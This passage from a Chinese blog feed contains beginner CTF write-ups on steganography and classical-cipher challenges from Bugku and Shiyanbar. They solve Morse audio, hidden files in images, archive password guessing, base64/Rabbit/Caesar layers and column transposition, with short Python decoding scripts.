href="https://pan.baidu.com/s/1i49Jhlj">https://pan.baidu.com/s/1i49Jhlj</a>  下载到一段音频<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777706049736_201104351_H800.png" alt="在这里插入图片描述"><br>听了一哈，emm…感觉像是是摩斯密码；声音文件可以直接打开，可以根据声音记录下密码，或者使用<strong>Audacity</strong>查看下<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777704360678_201104351_H800.png" alt="在这里插入图片描述"><br>根据这段音谱，长的为<code>-</code> 短的为<code>.</code><br>其密文为：<code>-.- . -.-- .-.. . - ..- ... --. --- </code>  解密得:<code>KEYLETUSGO</code><br>经过几次尝试，文档密码为：<code>letusgo</code> 打开文档<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777708702576_201104351_H800.png" alt="在这里插入图片描述"><br>一只张二哈的图片；根据经验，查看下文档有没有隐藏文字；在文件点击选项→显示→隐藏文字<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777707527592_201104351_H800.png" alt="在这里插入图片描述"><br>果然发现了 image steganography （图片隐写术）字样，看来应该是这张图片内部是被写入了关键数据；这里百度了一下才知道要咋做，把这张二哈的图片传入这个工具：→<a href="http://www.atool9.com/steganography.php">链接</a><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777709179498_201104351_H800.png" alt="在这里插入图片描述"><br>得到密码为：<code>key&#123;you are in finally hell now&#125;</code><br>输入：<code>you are in finally hell now</code>打开文本文档和图片 ；<br>啊啊啊！后来才知道这两个加密文档是同一个key,气死我了，查了我好长时间⊙﹏⊙<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777709742014_201104351_H800.png" alt="在这里插入图片描述"><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777701855499_201104351_H800.jpg" alt="在这里插入图片描述"><br>查看了下图片详细信息，没啥东西 ，binwalk一波<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777704358939_201104351_H800.png" alt="在这里插入图片描述"><br>发现有个压缩包，分离出来后发现是加密的（不知道为啥我用binwalk分离出来的压缩包打不开，又用foremost分离出来的）<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777705971853_201104351_H800.png" alt="在这里插入图片描述"><br>打开又是一个加密文本，很明显，上面那串二进制应该就是线索了。拿去在线二进制转字符串得到：<code>ruokouling</code>（弱口令）<a href="http://www.txttool.com/wenben_binarystr.asp">工具链接</a><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777707334653_201104351_H800.png" alt="在这里插入图片描述"><br>尝试提交一下密码，发现并不行，那就使用字典破解去吧，（弱口令属于字典的一种）这里我使用的是ARCHPR<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777703600307_201104351_H800.png" alt="在这里插入图片描述"><br>很容易的得到口令：<code>Password </code> 打开文档<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777701524626_201104351_H800.png" alt="在这里插入图片描述"><br>密文<code>VTJGc2RHVmtYMTlwRG9yWjJoVFArNXcwelNBOWJYaFZlekp5MnVtRlRTcDZQZE42elBLQ01BPT0=</code><br>啊，这题真的是神仙啊(￣_￣|||)   ；从文本中可以得到这段密文经过了凯撒、base64 、和rabbit加密<br>根据密文应该先进行base64解密；工具都是在线的，链接就不放了。<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777702279999_201104351_H800.png" alt="在这里插入图片描述"><br>解密结果：</p><pre><code>U2FsdGVkX19pDorZ2hTP+5w0zSA9bXhVezJy2umFTSp6PdN6zPKCMA==</code></pre><p>然后rabbit解密：<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777707141432_201104351_H800.png" alt="在这里插入图片描述"><br>密文：<code>fxbqrwrvnwmngrjxsrnsrnhx</code><br>最后凯撒解密：<a href="http://www.zjslove.com/3.decode/kaisa/index.html">工具链接</a><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777706919184_201104351_H800.png" alt="在这里插入图片描述"><br>显然第十次解密内容就是flag <code>woshinimendexiaojiejieyo</code>    呼~ 终于结束了(～￣▽￣)～<br><strong>2、stegas 300</strong><br>点击链接下载了一段音频，链接：<code>http://ctf5.shiyanbar.com/stega/siri_audio/siri_audio.zip </code> ；听了下没啥信息，在用Au打开：<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777707446311_201104351_H800.png" alt="在这里插入图片描述"><br>emm…因为是小白，还没做过这种题，翻了翻别人的blog 知道了这是<strong>曼彻斯特编码</strong><br><strong>编码规则</strong></p><blockquote><p>在曼彻斯特编码中，每一位的中间有一跳变，位中间的跳变既作时钟信号，又作数据信号；从高到低跳变表示“0”，从低到高跳变表示“1”。还有一种是差分曼彻斯特编码，每位中间的跳变仅提供时钟定时，而用每位开始时有无跳变表示“0”或“1”，有跳变为“0”，无跳变为“1”。<br>其中非常值得注意的是，在每一位的”中间”必有一跳变，根据此规则，可以得出曼彻斯特编码波形图的画法。例如：传输二进制信息0，若将0看作一位，我们以0为中心，在两边用虚线界定这一位的范围，然后在这一位的中间画出一个电平由高到低的跳变。后面的每一位以此类推即可画出整个波形图。</p></blockquote><p>我们可以根据这个信息来找出数据即<br>低开高跳为<code>0</code><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777703605428_201104351_H800.png" alt="在这里插入图片描述"><hr><br>高开低收为<code>1</code><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777709995020_201104351_H800.png" alt="在这里插入图片描述"><br>于是得出以下数据：</p><pre><code>011000100110000101101011011001000110111101110010</code></pre><p>先转字符串看看<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/06/2019/0724/22/15639777707309053_201104351_H800.png" alt="在这里插入图片描述"><br> 这里辛亏看了下别人的blog 提交的格式很坑，竟然要把bakdor MD5加密(￣_￣|||)  好吧；<code>flag&#123;e1b64df17443b51e3007fd3d5370dca1&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 隐写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学（二）</title>
      <link href="2019/07/21/%E5%AF%86%E7%A0%81%E5%AD%A6%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>2019/07/21/%E5%AF%86%E7%A0%81%E5%AD%A6%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>1、凯撒部长的奖励<br>2、告诉你个秘密(ISCCCTF)<br>3、变异凯撒<br>4、传统知识+古典密码</p><a id="more"></a><p><strong>1、凯撒部长的奖励</strong><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/83/2019/0721/16/15636971007962172_201104351_H800.png" alt="在这里插入图片描述"><br>密文：<code>MSW&#123;byly_Cm_sIol_lYqUlx_yhdIs_Cn_Wuymul_il_wuff_bcg_pCwnIl_cm_u_Yrwyffyhn_guh_cz_sio_quhn_ni_ayn_bcm_chzilguncihm_sio_wuh_dich_om&#125;</code><br>看着挺凶的题，拿去解个密竟然就出来了；这里使用的是Bugku的工具，不得不说，真的很好用，嘿嘿。<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/83/2019/0721/16/15636971007264636_201104351_H800.png"><br>flag：<code>SYC&#123;here_Is_yOur_rEwArd_enjOy_It_Caesar_or_call_him_vIctOr_is_a_Excellent_man_if_you_want_to_get_his_informations_you_can_join_us&#125;</code><br><strong>2、告诉你个秘密(ISCCCTF)</strong><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/83/2019/0721/16/15636971001479119_201104351_H800.png" alt="在这里插入图片描述">密文：</p><pre><code>636A56355279427363446C4A49454A7154534230526D684356445A31614342354E326C4B4946467A5769426961453067</code></pre><p>先来理性分析一波</p><ol><li><p>查看给定的字符串中，字符只有A-F，并且字符串两两结合对应的十进制小于128（ASCII码范围为0–127）</p></li><li><p>将他们转化为ascii对应的字符<br><code>cjV5RyBscDlJIEJqTSB0RmhCVDZ1aCB5N2lKIFFzWiBiaE0g</code></p></li><li><p>2中得到的字符串，像是经过了base64编码，进行解密得<br><code>r5yG lp9I BjM tFhBT6uh y7iJ QsZ bhM</code></p></li><li><p>看到这以空格分组的字符串，也懵逼了，到底啥意思呢，低头对着键盘。<br>发现r5yg包着了t，以此类推得到tongyuan。（这是键盘加密）</p></li><li><p>小写无法提交，使用大写提交</p></li></ol><p>代码：</p><pre><code>#coding:utf-8import base64strs=&quot;636A56355279427363446C4A49454A7154534230526D684356445A31614342354E326C4B4946467A5769426961453067&quot;i = 0strs_len = len(strs)chs=[]while(i &lt; strs_len):    chs.append(chr(int(strs[i:i+2],16)))    i = i + 2print(&quot;&quot;.join(chs))print(base64.decodestring(&quot;&quot;.join(chs)))</code></pre><p><strong>3、变异凯撒</strong><br>加密密文：<code>afZ_r9VYfScOeO_UL^RWUc</code><br>由题目中得知，这个密文的加密与凯撒解密有关，那就先解下密；<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/83/2019/0721/16/15636971001399059_201104351_H800.png" alt="在这里插入图片描述"><br>但是解密内容貌似并没有我们想要的；那来分析下他们的ASCII码吧<br>密文：<code>afZ_r9VYfScOeO_UL^RWUc</code>，看看能否与<code>ctf</code> 或者<code>flag</code> 对应上，</p><pre><code>a:97    f:102    Z:106     _:95`                                                                                                                           c:99    t:116    f:102     &#123;:123f:102   l:108    a:97      g:103</code></pre><p>可以发现规律a→f 移动了5  ； f→l移动了6， 后面依次移动了7、8。<br>知道了这些就可以写脚本了：</p><pre><code>#!/usr/bin/env python# coding:utf-8def b_kaisa(mstr):    j = 5    i = 0    lmstr = []    for i in range(len(mstr)):        m = ord(mstr[i])          # 将密文的第i个字母变为其ascii码值        m = m + j                 # ascii值+j        lmstr.append(m)           # 将递进后的ascii值存入列表lmstr[]        i = i+1        j = j+1    return lmstrif __name__ == &#39;__main__&#39;:    m_str = &#39;afZ_r9VYfScOeO_UL^RWUc&#39;    # 密文    lstr = []    lstr = b_kaisa(m_str)    print lstr</code></pre><p>运行结果：<img src="https://img-blog.csdnimg.cn/20190721140851536.png" alt="在这里插入图片描述"><br>然后将这些ASCII码转换为字符串就好了；<br><img src="https://img-blog.csdnimg.cn/20190721144855252.png" alt="在这里插入图片描述"></p><p>   <code> flag&#123;Caesar_variation&#125;</code></p><p><strong>4、传统知识+古典密码</strong><br>小明某一天收到一封密信，信中写了几个不同的年份<br>          辛卯，癸巳，丙戌，辛未，庚辰，癸酉，己卯，癸巳。<br>          信的背面还写有“+甲子”，请解出这段密文。</p><p>key值：CTF{XXX}</p><p>额…这题感jio很有意思的亚子；这里的年份是天干地支纪年法，其中一个甲子是60年，百度下这些年份的，这里得到了一张应该有用的信息：<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/83/2019/0721/16/15636971006482468_201104351_H800.png" alt="在这里插入图片描述"><br>对应着这些年份：<br>  辛卯：28<br>  癸巳：30<br>  丙戌：23<br>  辛未：8<br>  庚辰：17<br>  癸酉：10<br>  己卯：16<br>  癸巳：30<br> 题干中说信的背面还写有“+甲子”，于是我们可以把每个数加上60即可<br>  88，90，83，68，77，70，76，90<br>  emmm…得到这些数字把它们转化成ascii码看看 </p><pre><code> XZSDMFLZ</code></pre><p>没有别的提示，只好去翻翻别人的blog ，才知道需要先栅栏解密，2位一栏，然后再凯撒解密。唉，我错了，这题挺无聊的￣へ￣<br>flag：<code>CTF&#123;SHUANGYU&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku杂项(二)</title>
      <link href="2019/07/18/Bugku%20%E6%9D%82%E9%A1%B9%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>2019/07/18/Bugku%20%E6%9D%82%E9%A1%B9%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p><strong>1、又一张图片，还单纯吗</strong><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589962073058_201104351_H1920.png" alt="在这里插入图片描述"><br>链接地址：<a href="http://123.206.87.240:8002/misc/2.jpg">http://123.206.87.240:8002/misc/2.jpg</a><br>打开一看是一张图<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589963366997_201104351_H800.jpg" alt="在这里插入图片描述"><br>先查看一下图片详细信息，不能在吃了上次的亏；emm…没发现啥信息,直接用刚得到的神器binwalk一下(～￣▽￣)～<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589963593089_201104351_H1920.png" alt="在这里插入图片描述"><br>哇哦<del>，竟然藏着这么多图片，唉，按顺序一个个分离吧；<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589961454236_201104351_H800.png" alt="在这里插入图片描述"><br>哦吼</del>第一张打开一看竟然就是flag吗，提交试试—对了，真好。<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589969713368_201104351_H800.png" alt="在这里插入图片描述"><br><strong>2、隐写2</strong><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589964857928_201104351_H800.png" alt="在这里插入图片描述"><br>打开是一张表情包：<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589966810932_201104351_H800.jpg" alt="在这里插入图片描述"><br>B数，自在人心(●’◡’●)  先用winhex看看 ，额 在之最后面发现了可疑的信息(⊙_⊙)？<img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589961327786_201104351_H800.png" alt="在这里插入图片描述"><br>尝试把后缀名改了，果然 打开后有一个压缩包和一张图片<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589967894562_201104351_H800.png" alt="在这里插入图片描述"><br>打开提示：<img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589967797359_201104351_H800.jpg" alt="在这里插入图片描述"><br>这里提示信息已将很明显了， 国王是K ；女神是Q ；骑士是J   不知道的可以百度下；尝试输入KQJ解密，但是失败了，看看提示发现密码是三个数字， 没看清 大意了╰(￣ω￣ｏ)<br>既然只有三位数直接暴力破解好了；很快得到密码：<strong>871</strong> ；其实对照键盘也是可以猜出来的<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589967169776_201104351_H800.png" alt="在这里插入图片描述"><br>打开是这样的一张图，emmm… 再次丢进winhex里面<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589963700206_201104351_H800.jpg" alt="在这里插入图片描述"><br>在末尾发现了flag^o^/：<code>f1@g&#123;eTB1IEFyZSBhIGhAY2tlciE=&#125;</code><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589961432233_201104351_W120.png" alt="在这里插入图片描述"><br>然而提交失败╯︿╰，观察发现 这个flag应该被base加密了，拿去base64解密后得到<br>flag：<code>fl@g&#123;y0u Are a h@cker!&#125;</code>，再次提交，成功。<br><strong>3、细心的大象</strong><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589964833676_201104351_H1920.png" alt="在这里插入图片描述"><br>打开是一张图片：<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589963096230_201104351_H800.jpg" alt="在这里插入图片描述"><br>先看下图片详细信息<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589963395800_201104351_H800.png" alt="在这里插入图片描述"><br>额…看着应该是base64；拿去解下密：<code>MSDS456ASD123zz</code><br>不用说了，图片肯定隐藏着压缩包，直接用<strong>foremost</strong>分离出来<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589963300232_201104351_H800.png" alt="在这里插入图片描述"><br>输入解出来密码，额，又是杂项（一）隐写的那题，下面的步骤就不写了(●’◡’●)<br><strong>4、爆照(08067CTF)</strong><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589964884809_201104351_H800.png" alt="在这里插入图片描述"><br>打开是一张妹子的照片：<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589967249183_201104351_H800.jpg" alt="在这里插入图片描述"><br>先看下图片详细信息，啥也没有，直接binwalk吧<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589967647360_201104351_H800.png" alt="在这里插入图片描述"><br>哦吼~好多压缩包，直接用foremost分离吧，分离出一个压缩包，打开<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589965269995_201104351_H800.png" alt="在这里插入图片描述"><br>额 ＞︿＜ 没思路啊，直接拿去binwalk吧<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589964923678_201104351_H800.png" alt="在这里插入图片描述"><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589966736129_201104351_H800.png" alt="在这里插入图片描述"><br>可以看到88/888/8888里有图片，8888里还有一个压缩包，全都提取出来。<br>88：<img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589964822191_201104351_H800.jpg" alt="在这里插入图片描述"><br>扫描二维码：bilibili<br>888：<img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589967020918_201104351_H800.jpg" alt="在这里插入图片描述"><br>没啥东西，查看下详细信息：果然有东西<code>c2lsaXNpbGk=</code><br>拿去base64解码：<code>silisili</code><br>8888：图片<img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589963015826_201104351_H800.jpg" alt="在这里插入图片描述"><br>没啥信息；<br>zip打开有张二维码：<img src="http://img1002-c.pocoimg.cn/image/poco/works/28/2019/0718/22/15634589962413249_201104351_H800.png" alt="在这里插入图片描述"><br>扫描得：panama<br>多番尝试提交得到flag{bilibili_silisili_panama}<br>不得不说，这题真狗！！！<br>好，日后继续更新ヾ(≧▽≦*)o</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku杂项(一)</title>
      <link href="2019/07/14/Bugku%20%E6%9D%82%E9%A1%B9/"/>
      <url>2019/07/14/Bugku%20%E6%9D%82%E9%A1%B9/</url>
      
        <content type="html"><![CDATA[<h5 id="1、这是一张单纯的图片"><a href="#1、这是一张单纯的图片" class="headerlink" title="1、这是一张单纯的图片"></a>1、这是一张单纯的图片</h5><p><img src="http://img1002-c.pocoimg.cn/image/poco/works/96/2019/0714/19/15631022921926420_201104351_H800.png" alt="在这里插入图片描述"><br>将图片保存到本地，使用winhex打开图片，在末尾发现了一组数据信息<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/96/2019/0714/19/15631022923403416_201104351_H800.png" alt="在这里插入图片描述"><br><code>&amp;#107;&amp;#101;&amp;#121;&amp;#123;&amp;#121;&amp;#111;&amp;#117;&amp;#32;&amp;#97;&amp;#114;&amp;#101;&amp;#32;&amp;#114;&amp;#105;&amp;#103;&amp;#104;&amp;#116;&amp;#125;</code><br> 这是HTML的编码，可以通过游览器解析拿到flag；<br> <strong>步骤</strong>：新建文本文档，把上面的编码放进去，更改后缀名为html,双击打开即可<img src="http://img1002-c.pocoimg.cn/image/poco/works/96/2019/0714/19/15631022926900577_201104351_H800.png" alt="在这里插入图片描述"></p><h5 id="2、隐写"><a href="#2、隐写" class="headerlink" title="2、隐写"></a>2、隐写</h5><p><img src="http://img1002-c.pocoimg.cn/image/poco/works/96/2019/0714/19/15631022928856505_201104351_H800.png" alt="在这里插入图片描述"><br> 下载压缩包 打开，一张图片：<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/96/2019/0714/19/15631022921680398_201104351_H800.png" alt="这里这张图是截图，原图放上显示不出来"><br>既然题目提示为隐写，那就直接用winhex打开吧<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/96/2019/0714/19/15631022927135178_201104351_H800.png" alt="在这里插入图片描述"><br><code>89504e47</code> 是png图片的没有问题，因为是隐写题 所以图片的宽高应该被改了；查看PNG文件格式，IHDR后面的八个字节就是宽高的值 <img src="http://img1002-c.pocoimg.cn/image/poco/works/96/2019/0714/19/15631022925580290_201104351_H800.png" alt="在这里插入图片描述"> 即 </p><blockquote><p>宽：000001F4   高：000001A4</p></blockquote><p>将图片的高改成和宽一样,即将A4改成F4，然后另存为，打开刚存的图片就可以得到flag了<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/96/2019/0714/19/15631022926796820_201104351_H800.png" alt="在这里插入图片描述"></p><h5 id="3、啊哒"><a href="#3、啊哒" class="headerlink" title="3、啊哒"></a>3、啊哒</h5><p><img src="http://img1002-c.pocoimg.cn/image/poco/works/96/2019/0714/19/15631022923627383_201104351_H800.png" alt="在这里插入图片描述"><br>下载文件打开，也是一张图片<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/96/2019/0714/19/15631022929199235_201104351_H1920.jpg" alt="在这里插入图片描述"><br>将图片放进winhex、notepad++打开都没发现什么，用binwalk分析下<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/96/2019/0714/19/15631022921064837_201104351_H1920.png" alt="在这里插入图片描述"><br> 发现包含有压缩包，使用dd命令分离文件<img src="http://img1002-c.pocoimg.cn/image/poco/works/96/2019/0714/19/15631022926086238_201104351_H800.png" alt="在这里插入图片描述"><br>得到压缩包，打开发现需要密码    ￣へ￣  ，无奈，只能从图片上找问题，属性→详细信息，发现一串16进制数<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/96/2019/0714/19/15631022925306386_201104351_H800.png" alt="在这里插入图片描述"><br>这应该就是密码(‾◡◝)尝试16进制转字符串（密码一般都是字符串）<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/96/2019/0714/19/15631022926929820_201104351_H800.png" alt="在这里插入图片描述"><br>输入解出的字符串，OK 成功得到flagヾ(≧▽≦*)o</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实验吧--密码学</title>
      <link href="2019/07/14/%E5%AE%9E%E9%AA%8C%E5%90%A7--%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
      <url>2019/07/14/%E5%AE%9E%E9%AA%8C%E5%90%A7--%E5%AF%86%E7%A0%81%E5%AD%A6/</url>
      
        <content type="html"><![CDATA[<p>1、围在栅栏中的爱<br>2、古典密码<br>3、奇妙的音乐</p><a id="more"></a><p><strong>1、围在栅栏中的爱</strong></p><p>最近一直在好奇一个问题，QWE到底等不等于ABC？</p><pre><code>-.- .. --.- .-.. .-- - ..-. -.-. --.- --. -. ... --- --- </code></pre><p>flag格式：CTF{xxx}<br>emm… 密文一看就是摩斯密码，拿去解下密→<a href="https://www.jb51.net/tools/morse.htm">在线工具</a><br><img src="http://img-blog.csdnimg.cn/20190725152439836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解密结果<code>KIQLWTFCQGNSOO </code>  没思路了，翻了翻别人的blog知道了要进行<strong>QWE</strong>解密；<br><strong>QWE加密：</strong><br>从电脑键盘上的字母从Q开始数，顺序是Q W E R T Y U I。。。对应的字母顺序依次是A B C D E F G H 也就是说Q=A,W=B,E=C，依次类推。<br>拿去解密 →<a href="https://www.zjslove.com/3.decode/qwe/index.html">在线工具</a><br><img src="http://img-blog.csdnimg.cn/20190725154828273.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接下来既然题目说了有关栅栏，那就拿去解下密<br><img src="http://img-blog.csdnimg.cn/20190725155139938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>仔细观察 发现第一个解密内容是有信息的，去倒叙解密下：</p><pre><code>iloveshiyanbar</code></pre><p>OK  flag:<code>CTF&#123;iloveshiyanbar&#125;</code></p><p><strong>2、古典密码</strong><br>密文内容如下{79 67 85 123 67 70 84 69 76 88 79 85 89 68 69 67 84 78 71 65 72 79 72 82 78 70 73 69 78 77 125 73 79 84 65}<br>请对其进行解密<br>提示：<br>    1.加解密方法就在谜面中<br>    2.利用key值的固定结构</p><p>格式：CTF{ } <hr><br>这题挺有意思的；先将这些数字转换为ascii码字符：<code>OCU&#123;CFTELXOUYDECTNGAHOHRNFIENM&#125;IOTA</code><br>古典密码中最基础的加密法：<strong>列置换加密</strong>：将明文按固定长m分组，即每行m个字母，在密钥控制下按某一顺序交换列，最后按列优先的顺序依次读出，产生了密文。<br>例： ABCDEFGHIJKL  共12位 将它们列为4行3列（当然也可以是2x6，有多种可能）</p><pre><code>1 2 3 4A B C DE F G HI J K L</code></pre><p>改变一下列的顺序</p><pre><code>2 1 4 3B A D CF E H GJ I L K</code></pre><p>就是这样，解密的话只需要找出列的顺序还原下就好了。这题提示了 <strong>利用key值的固定结构</strong>即根据CTF三个首字符找出顺序<br>密文一共35位 那就有两种排列方式7x5 或 5x7<br>先来试试7x5<br>得到如下结果：</p><pre><code>1 2 3 4 5 6 7O C U &#123; C F TE L X O U Y DE C T N G A HO H R N F I EN M &#125; I O T A</code></pre><p> key值的固定结构为CTF{}<br>故第2列打头或第5列打头，接下来是第7列，然后是第6列，考虑到“{”是第4列，考虑到“}”是最后一列<br>尝试后得到<br><strong>1234567</strong>列转换为<strong>2764513</strong><br>即为：</p><pre><code>2 7 6 4 5 1 3C T F &#123; C O UL D Y O U E XC H A N G E TH E I N F O R M A T I O N &#125;</code></pre><blockquote><p>CTF{COULDYOUEXCHANGETHEINFORMATION}</p></blockquote><p> could you exchange the information ？为有意义的句子，提交flag正确。<br> 至于另一种，5x7情况下，因为CTF三个字符没在在首列，所以排除这种情况！</p><pre><code>  12345  OCU&#123;C  FTELX  OUYDE  CTNGA  HOHRN  FIENM  &#125;IOTA</code></pre><p><strong>3、奇妙的音乐</strong><br>据说flag就藏在这段音乐中，请仔细听。</p><p>格式：CTF{}</p><p>解题链接： <a href="http://ctf5.shiyanbar.com/crypto/123.zip">http://ctf5.shiyanbar.com/crypto/123.zip</a><br>这题很简单，本来不想写的，但还是记录下比较好<br>点击链接 下载一个压缩包，打开里面一张图片和一段加密音频文件<br><img src="http://img-blog.csdnimg.cn/20190725231236174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开图片：<br><img src="http://img-blog.csdnimg.cn/20190725231300356.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下面有很多小点，因为海伦•凯勒是聋哑人，所以下面应该是盲文，百度找找盲文对照表<br><img src="http://img-blog.csdnimg.cn/20190725231912276.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>对照表密文为 <code>kmdonowg</code> 成功打开音频文件，听了一下，应该是摩斯密码<br>用Au打开，查看音谱图<br><img src="http://img-blog.csdnimg.cn/20190726132809508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里把界面调窄一点的话会更清楚，即<br><img src="http://img-blog.csdnimg.cn/20190726133033572.png" alt="在这里插入图片描述"><br>手动打出密文：<code>-.-.  -  ..-.  .--   .--. .   ..  -----   ---..   --...   ...--   ..---  ..--..   ..---   ...--  -..  --..   </code><br>解码得：<code>CTFWPEI08732?23DZ</code>  大写提交不通过，换成小写flag：<code>CTF&#123;wpei08732?23dz&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku密码学（一）</title>
      <link href="2019/07/14/Bugku%20%E5%AF%86%E7%A0%81%E5%AD%A6(%E4%B8%80)/"/>
      <url>2019/07/14/Bugku%20%E5%AF%86%E7%A0%81%E5%AD%A6(%E4%B8%80)/</url>
      
